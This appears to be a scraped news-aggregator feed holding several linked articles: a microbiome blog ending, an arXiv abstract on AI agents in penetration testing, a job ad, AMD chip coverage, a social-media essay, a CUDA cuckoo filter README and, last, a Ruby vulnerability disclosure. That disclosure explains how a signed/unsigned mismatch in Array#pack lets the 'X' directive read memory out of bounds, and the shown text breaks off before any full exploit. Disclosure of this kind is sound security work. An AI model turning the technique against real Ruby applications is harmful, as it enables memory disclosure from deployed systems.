    &lt;p&gt;However, there is some light evidence that the variation I see is not just intra-day variation. Specifically, there are several species that stay consistent in frequency across all samples: e.g., Neisseria subflava, Streptococcus viridans, Streptococcus oralis.&lt;/p&gt;
    &lt;head rend="h1"&gt;Conclusions&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;L. reuteri didn't detectably colonize my mouth. Oral probiotics are surprisingly difficult to detect, even if you sample the same day as dosing.&lt;/item&gt;
      &lt;item&gt;S. salivarius increased massively in abundance, but this increase happened after I stopped taking BioGaia&lt;/item&gt;
      &lt;item&gt;Microbiome sequencing can be used to assess oral health. None of the "red complex" bacteria (P. gingivalis, T. forsythia, T. denticola) associated with gum disease were found in any sample.&lt;/item&gt;
      &lt;item&gt;The oral microbiome is dynamic, with huge swings in species abundance over a timeframe of just weeks&lt;/item&gt;
      &lt;item&gt;Microbiome sequencing is very easy and convenient these days thanks to Plasmidsaurus&lt;/item&gt;
      &lt;item&gt;Prodentis tastes good, may help with oral health, and I'd consider taking it again&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.booleanbiotech.com/oral-microbiome-biogaia"/><published>2026-01-06T21:10:47+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46518996</id><title>Comparing AI agents to cybersecurity professionals in real-world pen testing</title><updated>2026-01-07T00:55:14.699127+00:00</updated><content>&lt;doc fingerprint="919c362341ffe08f"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Computer Science &amp;gt; Artificial Intelligence&lt;/head&gt;&lt;p&gt; [Submitted on 10 Dec 2025]&lt;/p&gt;&lt;head rend="h1"&gt;Title:Comparing AI Agents to Cybersecurity Professionals in Real-World Penetration Testing&lt;/head&gt;View PDF HTML (experimental)&lt;quote&gt;Abstract:We present the first comprehensive evaluation of AI agents against human cybersecurity professionals in a live enterprise environment. We evaluate ten cybersecurity professionals alongside six existing AI agents and ARTEMIS, our new agent scaffold, on a large university network consisting of ~8,000 hosts across 12 subnets. ARTEMIS is a multi-agent framework featuring dynamic prompt generation, arbitrary sub-agents, and automatic vulnerability triaging. In our comparative study, ARTEMIS placed second overall, discovering 9 valid vulnerabilities with an 82% valid submission rate and outperforming 9 of 10 human participants. While existing scaffolds such as Codex and CyAgent underperformed relative to most human participants, ARTEMIS demonstrated technical sophistication and submission quality comparable to the strongest participants. We observe that AI agents offer advantages in systematic enumeration, parallel exploitation, and cost -- certain ARTEMIS variants cost $18/hour versus $60/hour for professional penetration testers. We also identify key capability gaps: AI agents exhibit higher false-positive rates and struggle with GUI-based tasks.&lt;/quote&gt;&lt;p&gt; Current browse context: &lt;/p&gt;&lt;p&gt;cs.AI&lt;/p&gt;&lt;head rend="h3"&gt;References &amp;amp; Citations&lt;/head&gt;&lt;p&gt; export BibTeX citation Loading... &lt;/p&gt;&lt;head rend="h1"&gt;Bibliographic and Citation Tools&lt;/head&gt;&lt;p&gt; Bibliographic Explorer (What is the Explorer?) &lt;/p&gt;&lt;p&gt; Connected Papers (What is Connected Papers?) &lt;/p&gt;&lt;p&gt; Litmaps (What is Litmaps?) &lt;/p&gt;&lt;p&gt; scite Smart Citations (What are Smart Citations?) &lt;/p&gt;&lt;head rend="h1"&gt;Code, Data and Media Associated with this Article&lt;/head&gt;&lt;p&gt; alphaXiv (What is alphaXiv?) &lt;/p&gt;&lt;p&gt; CatalyzeX Code Finder for Papers (What is CatalyzeX?) &lt;/p&gt;&lt;p&gt; DagsHub (What is DagsHub?) &lt;/p&gt;&lt;p&gt; Gotit.pub (What is GotitPub?) &lt;/p&gt;&lt;p&gt; Hugging Face (What is Huggingface?) &lt;/p&gt;&lt;p&gt; Papers with Code (What is Papers with Code?) &lt;/p&gt;&lt;p&gt; ScienceCast (What is ScienceCast?) &lt;/p&gt;&lt;head rend="h1"&gt;Demos&lt;/head&gt;&lt;head rend="h1"&gt;Recommenders and Search Tools&lt;/head&gt;&lt;p&gt; Influence Flower (What are Influence Flowers?) &lt;/p&gt;&lt;p&gt; CORE Recommender (What is CORE?) &lt;/p&gt;&lt;head rend="h1"&gt;arXivLabs: experimental projects with community collaborators&lt;/head&gt;&lt;p&gt;arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.&lt;/p&gt;&lt;p&gt;Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.&lt;/p&gt;&lt;p&gt;Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arxiv.org/abs/2512.09882"/><published>2026-01-06T21:23:07+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46519303</id><title>Laylo (YC S20) ‚Äì Head of Growth (Organic and Partners and Loops and AI) ‚Äì Remote US</title><updated>2026-01-07T00:55:14.067564+00:00</updated><content>&lt;doc fingerprint="b1dc8874f8cd840c"&gt;
  &lt;main&gt;
    &lt;p&gt;The CRM powering iconic musicians and events&lt;/p&gt;
    &lt;p&gt;Laylo is the Drop CRM powering iconic artists and live events. The platform combines landing pages, messaging, link tracking, and more to drive more tickets, merch and streams through Instagram DM, SMS and Email. Today, we power CRM across hundreds of millions of fans for some of the biggest names in entertainment like Sabrina Carpenter, Outside Lands and Skrillex.&lt;/p&gt;
    &lt;p&gt;Role Overview&lt;/p&gt;
    &lt;p&gt;We‚Äôre looking for a Head of Growth (player/coach) to build and run Laylo‚Äôs growth engine. A 0‚Üí1 builder who doesn‚Äôt just ideate, but ships. You‚Äôll create great content, run scrappy experiments, and build product growth loops that compound. This is a hands-on role: you‚Äôll set strategy, execute a rapid experiment cadence, measure results, and turn wins into repeatable playbooks.&lt;/p&gt;
    &lt;p&gt;You‚Äôll focus primarily on non-advertising channels: organic social, influencer/creator collaborations, channel partners, and product growth loops. We value strong taste, speed, and a rigorous learning cadence.&lt;/p&gt;
    &lt;p&gt;You‚Äôll report directly to the CEO and work closely with Product, Engineering, Design, Partnerships, and Sales. You‚Äôre likely a good fit if you‚Äôre excited to open Adobe/Figma/Notion/PostHog and ship something today.&lt;/p&gt;
    &lt;p&gt;Requirements:&lt;/p&gt;
    &lt;p&gt;You‚Äôll thrive here if you can:&lt;/p&gt;
    &lt;p&gt;Key Responsibilities:&lt;/p&gt;
    &lt;p&gt;What Success Looks Like:&lt;/p&gt;
    &lt;p&gt;What You Bring:&lt;/p&gt;
    &lt;p&gt;How To Apply:&lt;/p&gt;
    &lt;p&gt;Send us your first out-of-the-box idea for your first campaign in this role. Bonus points for mentioning other companies and campaigns you think are relevant.&lt;/p&gt;
    &lt;p&gt;Our founders met while building competing consumer startups. We launched multiple products across consumer and SaaS and talked to thousands of fans and creators in the process. In 2020, we realized one of the biggest pain points artists and events face is actually driving their audience from socials into their own CRM.&lt;/p&gt;
    &lt;p&gt;In 2020, we joined Y Combinator‚Äôs summer batch and began building a product that quickly gained strong early traction. We raised from top-tier investors like Eldridge and Sony and have since grown into a team of 24 exceptional individuals spanning product, sales, and operations.&lt;/p&gt;
    &lt;p&gt;We have a strong written documentation culture. We try to do as much as possible asynchronously to move quickly and efficiently. We have a daily 30 minute standup and team-specific meetings throughout the week.&lt;/p&gt;
    &lt;p&gt;Creators and Brands have a few key moments that drive the majority of their sales and fan engagement, we call them drops. At Laylo, we're building the Drop CRM to make these moments perfect.&lt;/p&gt;
    &lt;p&gt;With Laylo, creators and brands can notify fans the second they drop new content, merch and events. From there, they get a full featured CRM, a dashboard to connect with fans forever in the future, high conversion landing pages and deep analytics to conversions, click throughs and sales.&lt;/p&gt;
    &lt;p&gt;We work with some of biggest creators, brands, records labels and managers in the world to create incredible drop experiences.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.ycombinator.com/companies/laylo/jobs/ZtLHRXe-head-of-growth"/><published>2026-01-06T21:44:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46519326</id><title>CES 2026: Taking the Lids Off AMD's Venice and MI400 SoCs</title><updated>2026-01-07T00:55:13.852115+00:00</updated><content>&lt;doc fingerprint="ee681e65ab90b9d0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;CES 2026: Taking the Lids off AMD's Venice and MI400 SoCs&lt;/head&gt;
    &lt;p&gt;Hello you fine Internet folks,&lt;/p&gt;
    &lt;p&gt;Here at CES 2026, AMD showed off their upcoming Venice series of server CPUs and their upcoming MI400 series of datacenter accelerators. AMD has talked about the specifications of both Venice and the MI400 series at their Advancing AI event back in June of 2025, but this is the first time AMD has shown off the silicon for both of product lines.&lt;/p&gt;
    &lt;p&gt;Starting with Venice, the first thing to notice is the packaging of the CCDs to the IO dies is different. Instead of using the organic substrate of the package to run the wires between the CCDs and the IO dies that AMD has used since EPYC Rome, Venice appears to be using a more advanced form of packaging similar to Strix Halo or MI250X. Another change is that Venice appears to have two IO dies instead of the single IO die that the prior EPYC CPUs had.&lt;/p&gt;
    &lt;p&gt;Venice has 8 CCDs each of which have 32 cores for a total of up to 256 cores per Venice package. Doing some measuring of each of the dies, you get that each CCD is approximately 165mm2 of N2 silicon. If AMD has stuck to 4MB of L3 per core than each of these CCDs have 32 Zen 6 cores and 128MB of L3 cache along with the die to die interface for the CCD &amp;lt;-&amp;gt; IO die communications. At approximately 165mm2 per CCD, that would make a Zen 6 core plus the 4MB of L3 per core about 5mm2 each which is similar to Zen 5‚Äôs approximately 5.34mm2 on N3 when counting both the Zen 5 core and 4MB of L3 cache.&lt;/p&gt;
    &lt;p&gt;Moving to the IO dies, they each appear to be approximately 353mm2 for a total of just over 700mm2 of silicon dedicated for the IO dies. This is a massive increase from the approximately 400mm2 that the prior EPYC CPUs dedicated for their IO dies. The two IO dies appear to be using an advanced packaging of some kind similar to the CCDs. Next to the IO dies appear to be 8 little dies, 4 on each side of the package, which are likely to either be structural silicon or deep trench capacitor dies meant to improve power delivery to the CCDs and IO dies.&lt;/p&gt;
    &lt;p&gt;Shifting off of Venice and on to the MI400 accelerator, this is a massive package with 12 HBM4 dies and ‚Äútwelve 2 nanometer and 3 nanometer compute and IO dies‚Äù. It appears as if there are two base dies just like MI350. But unlike MI350, there appears to also be two extra dies on the top and bottom of the base dies. These two extra dies are likely for off-package IO such as PCIe, UALink, etc.&lt;/p&gt;
    &lt;p&gt;Calculating the die sizes of the base dies and the IO dies, the die size of the base die is approximately 747mm2 for each of the two base dies with the off-package IO dies each being approximately 220mm2. As for the compute dies, while the packaging precludes any visual demarcation of the different compute dies, it is likely that there are 8 compute dies with 4 compute dies on each base die. So while we can‚Äôt figure out the exact die size of the compute dies, the maximum size is approximately 180mm2. The compute chiplet is likely in the 140mm2 to 160mm2 region but that is a best guess that will have to wait to be confirmed.&lt;/p&gt;
    &lt;p&gt;The MI455X and Venice are the two SoCs that are going to be powering AMD‚Äôs Helios AI Rack but they aren‚Äôt the only new Zen 6 and MI400 series products that AMD announced at CES. AMD announced that there would be a third member of the MI400 family called the MI440X joining the MI430X and MI455X. The MI440X is designed to fit into the 8-way UBB boxes as a direct replacement for the MI300/350 series.&lt;/p&gt;
    &lt;p&gt;AMD also announced Venice-X which is likely is going to be a V-Cache version of Venice. This is interesting because not only did AMD skip Turin-X but if there is a 256 core version of Venice-X, then this would be the first time that a high core count CCD will have the ability to support a V-Cache die. If AMD sticks to the same ratio of base die cache to V-Cache die cache, then each 32 core CCD would have up to 384MB of L3 cache which equates to 3 Gigabytes of L3 cache across the chip.&lt;/p&gt;
    &lt;p&gt;Both Venice and the MI400 series are due to launch later this year and I can‚Äôt wait to learn more about the underlying architectures of both SoCs.&lt;/p&gt;
    &lt;p&gt;If you like the content then consider heading over to the Patreon or PayPal if you want to toss a few bucks to Chips and Cheese, also consider joining the Discord.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://chipsandcheese.com/p/ces-2026-taking-the-lids-off-amds"/><published>2026-01-06T21:46:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46519622</id><title>Are we tired of social media once and for all? On the downfall of social media</title><updated>2026-01-07T00:55:13.081060+00:00</updated><content>&lt;doc fingerprint="39c01f560825cb8f"&gt;
  &lt;main&gt;
    &lt;p&gt;9 months ago&lt;/p&gt;
    &lt;quote&gt;I've been asking this question to myself a few times now. When I speak with other peers, many are tired of social media. Without any hope for a change? I remember how different the times were like 20 years ago. Us fellow internet users weren't connected 24/7. We used to be online when we were in front of our desktop or laptop computer. Our ways of communicating happened via instant messaging systems or client-server based chat systems. ICQ, MSN, IRC, Skype, TeamSpeak, Ventrilo or Mumble were systems that were widely used. Plus we had forums.&lt;lb/&gt;Do you remember ICQ?&lt;lb/&gt;It was really a hype, something new to explore, exciting and more like a wild, wild west. However the Internet became more and more commercialised. And with many years passing by, social interactions have been taking place on a few big player networks, like Facebook, Instagram, TikTok, Reddit, Twitter, etc.&lt;lb/&gt;Forums were one way to organize communities&lt;lb/&gt;As a result of the recent shifts, I, personally, experienced some tiredness in socializing. The Internet drove us more away from each other, and this is also a shift that I feel takes place in real life as well. Of course, the internet and real life have become more interwined and there is definitely a correlation between these phenomena.&lt;lb/&gt;Mumble was one of the popular VoIP systems&lt;lb/&gt;Bubbles have emerged, hatespeech, plenty of ads, misinformation, et cetera. Bad news, controversial content and ragebait are things that bring plenty of financial revenue. Has the internet not become a giant capitalistic market place? Do we go online to entertain ourselves? Or do we go online merely as a consumer, a customer, to be spoonfed with marketing ads, while also getting flooded with news how bad everything is, that the world is practically doomed? And it only gets worse with the rise of AI generated rage/click-bait content across all social media platforms. This is not the Internet of the past. Nor is it the Internet as it should be.&lt;lb/&gt;Source: World Happiness Report&lt;lb/&gt;When I got my attention to Mastodon and the Fediverse, I believed this could be a way to get the exit on a highly commercialised highway that will eventually lead to a dead internet. See, Instagram and other social networks are currently a cash cow that is milked till oblivion. Enshittification is taking place on every aspect of the popular internet. It's not only social media that is affected. Take Google Play as an example. They are essentially abusing their power, hurting developers all around the globe. I don't want to dig too deep into the reality of Enshittification in this post, but if you want to know more, please see this Wikipedia article. Back to social media. Mastodon and other systems of the fediverse are great. No doubt, they have the power to better at least one portion of the Internet. I used to be registered on Mastodon for quite a while and at first it was an almost entirely great experience, with a few exceptions. That was a massive Yay, Mastodon ^_^, as my personal experience with Twitter (which I left for a while now) and Instagram, as well as other big tech platforms, have become utterly negative. So, Mastodon appeared as a light in the dark, given it is open-sourced software and doesn't patronize your feed. However after a while I realized that people just post into the void. Everyone has something to say or promote, yet no one wants to listen. It's like we're all having our booth on a crowded public space, but there are no actual recievers. I left mastodon after a while and moved to Bluesky. But it's just the same. It's the same everywhere. Thus I concluded that people overall are tired of socializing. Which is fine, and honestly, I admit that this is the case for me, too. At this point, I don't even know if I would want to connect with others that much. I, personally, merely go online, post some dev things, and then move on to something else. On the other hand, getting into a great community of developers, supporting each other and exchanging information, progress or simply chatting, is something I miss. Yet I don't really pursue a change here. I'm simply tired of social media - and people. And from what I see from others, I'm definitely not alone.&lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.danielbrendel.com/blog/24-are-we-tired-of-social-media-once-and-for-all"/><published>2026-01-06T22:15:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46519771</id><title>Show HN: GPU Cuckoo Filter ‚Äì faster queries than Blocked Bloom, with deletion</title><updated>2026-01-07T00:55:12.608775+00:00</updated><content>&lt;doc fingerprint="4adfe2ece0e02bc8"&gt;
  &lt;main&gt;
    &lt;p&gt;A high-performance CUDA implementation of the Cuckoo Filter data structure, developed as part of the thesis "Design and Evaluation of a GPU-Accelerated Cuckoo Filter".&lt;/p&gt;
    &lt;p&gt;This library provides a GPU-accelerated Cuckoo Filter implementation optimized for high-throughput batch operations. Cuckoo Filters are space-efficient probabilistic data structures that support insertion, lookup, and deletion operations with a configurable false positive rate.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;CUDA-accelerated batch insert, lookup, and delete operations&lt;/item&gt;
      &lt;item&gt;Configurable fingerprint size and bucket size&lt;/item&gt;
      &lt;item&gt;Multiple eviction policies (DFS, BFS)&lt;/item&gt;
      &lt;item&gt;Sorted insertion mode for improved memory coalescing&lt;/item&gt;
      &lt;item&gt;Multi-GPU support via gossip&lt;/item&gt;
      &lt;item&gt;IPC support for cross-process filter sharing&lt;/item&gt;
      &lt;item&gt;Header-only library design&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Benchmarks at 80% load factor on an NVIDIA GH200 (H100 HBM3, 3.4 TB/s). The GPU Cuckoo Filter is compared against:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;CPU Cuckoo Filter&lt;/item&gt;
      &lt;item&gt;Bulk Two-Choice Filter (TCF)&lt;/item&gt;
      &lt;item&gt;GPU Counting Quotient Filter (GQF)&lt;/item&gt;
      &lt;item&gt;GPU Blocked Bloom Filter&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Comparison&lt;/cell&gt;
        &lt;cell role="head"&gt;Insert&lt;/cell&gt;
        &lt;cell role="head"&gt;Query&lt;/cell&gt;
        &lt;cell role="head"&gt;Delete&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;GPU vs CPU Cuckoo&lt;/cell&gt;
        &lt;cell&gt;360√ó faster&lt;/cell&gt;
        &lt;cell&gt;973√ó faster&lt;/cell&gt;
        &lt;cell&gt;N/A&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Cuckoo vs TCF&lt;/cell&gt;
        &lt;cell&gt;6√ó faster&lt;/cell&gt;
        &lt;cell&gt;42√ó faster&lt;/cell&gt;
        &lt;cell&gt;100√ó faster&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Cuckoo vs GQF&lt;/cell&gt;
        &lt;cell&gt;585√ó faster&lt;/cell&gt;
        &lt;cell&gt;6√ó faster&lt;/cell&gt;
        &lt;cell&gt;273√ó faster&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Cuckoo vs Bloom&lt;/cell&gt;
        &lt;cell&gt;0.6√ó (slower)&lt;/cell&gt;
        &lt;cell&gt;1.4√ó faster&lt;/cell&gt;
        &lt;cell&gt;N/A&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Comparison&lt;/cell&gt;
        &lt;cell role="head"&gt;Insert&lt;/cell&gt;
        &lt;cell role="head"&gt;Query&lt;/cell&gt;
        &lt;cell role="head"&gt;Delete&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;GPU vs CPU Cuckoo&lt;/cell&gt;
        &lt;cell&gt;583√ó faster&lt;/cell&gt;
        &lt;cell&gt;1504√ó faster&lt;/cell&gt;
        &lt;cell&gt;N/A&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Cuckoo vs TCF&lt;/cell&gt;
        &lt;cell&gt;1.9√ó faster&lt;/cell&gt;
        &lt;cell&gt;11.3√ó faster&lt;/cell&gt;
        &lt;cell&gt;35.3√ó faster&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Cuckoo vs GQF&lt;/cell&gt;
        &lt;cell&gt;9.6√ó faster&lt;/cell&gt;
        &lt;cell&gt;2.6√ó faster&lt;/cell&gt;
        &lt;cell&gt;3.8√ó faster&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Cuckoo vs Bloom&lt;/cell&gt;
        &lt;cell&gt;0.7√ó (slower)&lt;/cell&gt;
        &lt;cell&gt;1.0√ó (equal)&lt;/cell&gt;
        &lt;cell&gt;N/A&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Note&lt;/p&gt;
    &lt;p&gt;For a more comprehensive evaluation including additional systems and analysis, see the accompanying thesis.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;CUDA Toolkit (&amp;gt;= 12.9)&lt;/item&gt;
      &lt;item&gt;C++20 compatible compiler&lt;/item&gt;
      &lt;item&gt;Meson build system (&amp;gt;= 1.3.0)&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;meson setup build
meson compile -C build&lt;/code&gt;
    &lt;p&gt;Benchmarks and tests are built by default. To disable them:&lt;/p&gt;
    &lt;code&gt;meson setup build -DBUILD_BENCHMARKS=false -DBUILD_TESTS=false&lt;/code&gt;
    &lt;code&gt;#include &amp;lt;CuckooFilter.cuh&amp;gt;

// Configure the filter: key type, fingerprint bits, max evictions, block size, bucket size
using Config = CuckooConfig&amp;lt;uint64_t, 16, 500, 256, 16&amp;gt;;

// Create a filter with the desired capacity
CuckooFilter&amp;lt;Config&amp;gt; filter(1 &amp;lt;&amp;lt; 20);  // capacity for ~1M items

// Insert keys (d_keys is a device pointer)
filter.insertMany(d_keys, numKeys);

// Or use sorted insertion
filter.insertManySorted(d_keys, numKeys);

// Check membership
filter.containsMany(d_keys, d_results, numKeys);

// Delete keys
filter.deleteMany(d_keys, d_results, numKeys);&lt;/code&gt;
    &lt;p&gt;The &lt;code&gt;CuckooConfig&lt;/code&gt; template accepts the following parameters:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Parameter&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
        &lt;cell role="head"&gt;Default&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;T&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Key type&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;bitsPerTag&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Fingerprint size in bits (8, 16, 32)&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;maxEvictions&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Maximum eviction attempts before failure&lt;/cell&gt;
        &lt;cell&gt;500&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;blockSize&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;CUDA block size&lt;/cell&gt;
        &lt;cell&gt;256&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;bucketSize&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Slots per bucket (must be power of 2)&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;AltBucketPolicy&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Alternate bucket calculation policy&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;XorAltBucketPolicy&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;evictionPolicy&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Eviction strategy (DFS or BFS)&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;BFS&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;WordType&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Atomic type (uint32_t or uint64_t)&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;uint64_t&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;For workloads that exceed single GPU capacity:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;CuckooFilterMultiGPU.cuh&amp;gt;

CuckooFilterMultiGPU&amp;lt;Config&amp;gt; filter(numGPUs, totalCapacity);
filter.insertMany(h_keys, numKeys);
filter.containsMany(h_keys, h_results, numKeys);&lt;/code&gt;
    &lt;code&gt;include/           - Header files
  CuckooFilter.cuh           - Main filter implementation
  CuckooFilterMultiGPU.cuh   - Multi-GPU implementation
  CuckooFilterIPC.cuh        - IPC support
  bucket_policies.cuh        - Alternative bucket policies
  helpers.cuh                - Helper functions
src/               - Example applications
benchmark/         - benchmarks
tests/             - Unit tests
scripts/           - Scripts for running/plotting benchmarks
&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/tdortman/cuckoo-filter"/><published>2026-01-06T22:33:21+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46520508</id><title>Hyundai Introduces Its Next-Gen Atlas Robot at CES 2026 [video]</title><updated>2026-01-07T00:55:11.823601+00:00</updated><content>&lt;doc fingerprint="50559455455d1642"&gt;
  &lt;main&gt;
    &lt;p&gt;About Press Copyright Contact us Creators Advertise Developers Terms Privacy Policy &amp;amp; Safety How YouTube works Test new features NFL Sunday Ticket ¬© 2026 Google LLC&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.youtube.com/watch?v=9e0SQn9uUlw"/><published>2026-01-06T23:40:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46520566</id><title>Vulnerability in Ruby that has existed since 2002</title><updated>2026-01-07T00:55:11.455577+00:00</updated><content>&lt;doc fingerprint="ec4059ade8319556"&gt;
  &lt;main&gt;
    &lt;p&gt;With the release of Ruby 4.0.0 on Christmas, I decided to revisit integer handling bugs within Ruby MRI, the canonical implementation of the Ruby programming language. This lead me to discover a vulnerability which allows reading memory out of bounds of the allocated string buffer. Although memory disclosure vulnerabilities have a serious impact, it is important to note that affected method is rarely used in real Ruby applications and very rarely would an attacker have control over the argument to the method call. The vulnerability affects Ruby 4.0.0 and prior, likely back as far as even Ruby 1.6.7 which was released in 2002. Follow the progress of the fix in PR #15763.&lt;/p&gt;
    &lt;p&gt;The vulnerability exists within the instance method pack of the Array class. The pack method accepts a template string argument, which it uses to determine how to convert the array's elements into a binary string. A template string is comprised of directives, where a directive is typically a single letter, such as "H" to indicate a hex string with high nibble first or "m" to indicate a base64 encoded string. The list of directives are inspired by Perl and the full list can be found in the Ruby Packed Data documentation. The directives may be followed by a repeat count which specifies how much a directive should consume, where H2 would consume two hex characters. It is this repeat count which can be unexpectedly made negative resulting in the vulnerability.&lt;/p&gt;
    &lt;p&gt;pack&lt;/p&gt;
    &lt;p&gt;Array&lt;/p&gt;
    &lt;p&gt;H2&lt;/p&gt;
    &lt;p&gt;The code responsible for repeat count handling of Array#pack can be found inside ruby/pack.c and looks as follows:&lt;/p&gt;
    &lt;p&gt;Array#pack&lt;/p&gt;
    &lt;p&gt;static VALUE pack_pack(rb_execution_context_t *ec, VALUE ary, VALUE fmt, VALUE buffer) { [...] long len, idx, plen; [...] p = RSTRING_PTR(fmt); [...] else if (ISDIGIT(*p)) { [...] len = STRTOUL(p, (char**)&amp;amp;p, 10);&lt;/p&gt;
    &lt;p&gt;This code retrieves the repeat count and stores it in the len variable. While the STRTOUL macro expands to a call to ruby_strtoul, which returns an unsigned long, the len variable is itself a signed long. This mismatch of unsigned and signed means large unsigned values will be interpreted as negative values when stored in len.&lt;/p&gt;
    &lt;p&gt;len&lt;/p&gt;
    &lt;p&gt;STRTOUL&lt;/p&gt;
    &lt;p&gt;ruby_strtoul&lt;/p&gt;
    &lt;p&gt;unsigned long&lt;/p&gt;
    &lt;p&gt;long&lt;/p&gt;
    &lt;p&gt;Now with the ability to generate a negative repeat count, we must find a directive that does something useful with a negative repeat count. Fortunately the X directive exists which is documented to "back up a byte" and behaves as follows:&lt;/p&gt;
    &lt;p&gt;X&lt;/p&gt;
    &lt;p&gt;irb(main):001&amp;gt; ["414243"].pack("H6") =&amp;gt; "ABC" irb(main):002&amp;gt; ["414243"].pack("H6X") =&amp;gt; "AB" irb(main):003&amp;gt; ["414243"].pack("H6XX") =&amp;gt; "A" irb(main):004&amp;gt; ["414243"].pack("H6X2") =&amp;gt; "A"&lt;/p&gt;
    &lt;p&gt;The implementation of the X directive is also found inside ruby/pack.c and looks as follows:&lt;/p&gt;
    &lt;p&gt;static VALUE pack_pack(rb_execution_context_t *ec, VALUE ary, VALUE fmt, VALUE buffer) { [...] switch (type) { [...] case 'X': /* back up byte */ shrink: plen = RSTRING_LEN(res); if (plen &amp;lt; len) rb_raise(rb_eArgError, "X outside of string"); rb_str_set_len(res, plen - len); break; [...]&lt;/p&gt;
    &lt;p&gt;What makes the X directive useful is that if we shrink our string by a negative amount we will unexpectedly grow the string instead.&lt;/p&gt;
